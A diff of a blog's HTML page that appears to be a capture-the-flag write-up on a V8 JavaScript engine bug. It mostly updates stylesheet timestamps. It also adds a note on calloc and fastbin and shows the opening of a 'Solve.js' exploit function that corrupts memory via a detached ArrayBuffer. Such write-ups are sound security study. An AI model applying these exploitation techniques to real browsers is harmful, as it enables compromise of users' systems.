@@ -45,11 +45,11 @@
 
 
     
-    <link rel="stylesheet" href="https://mhibio.github.io/css/reset.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
-    <link rel="stylesheet" href="https://mhibio.github.io/css/pygments.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
-    <link rel="stylesheet" href="https://mhibio.github.io/css/main.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/reset.css?t=2021-08-25%2009%3a33%3a47.5562862%20%2b0900%20KST%20m%3d%2b0.334629301">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/pygments.css?t=2021-08-25%2009%3a33%3a47.5562862%20%2b0900%20KST%20m%3d%2b0.334629301">
+    <link rel="stylesheet" href="https://mhibio.github.io/css/main.css?t=2021-08-25%2009%3a33%3a47.5562862%20%2b0900%20KST%20m%3d%2b0.334629301">
     
-        <link rel="stylesheet" href="https://mhibio.github.io/css/override.css?t=2021-08-25%2009%3a28%3a53.5441733%20%2b0900%20KST%20m%3d%2b0.290145901">
+        <link rel="stylesheet" href="https://mhibio.github.io/css/override.css?t=2021-08-25%2009%3a33%3a47.5562862%20%2b0900%20KST%20m%3d%2b0.334629301">
     
 
 
@@ -301,7 +301,8 @@ git checkout f7a1932ef928c190de32dd78246f75bd4ca8778b
 </code></pre></div><p>Directly call <code>%ArrayBufferDetach</code> without <code>--allow-native-syntax</code> flag<br>
 only <code>%ArrayBufferDetach</code> is possible.</p>
 <h2 id="new-arraybuffersize">new ArrayBuffer(size);</h2>
-<p><code>new ArrayBuffer(size);</code> use <code>calloc</code>.</p>
+<p><code>new ArrayBuffer(size);</code> use <code>calloc</code>.
+=&gt; <code>calloc</code> use <code>fastbin</code></p>
 <h2 id="solvejs">Solve.js</h2>
 <div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">victim</span><span class="p">,</span> <span class="nx">header</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
     <span class="nx">victim</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nx">body</span><span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x1000000</span><span class="p">;</span>
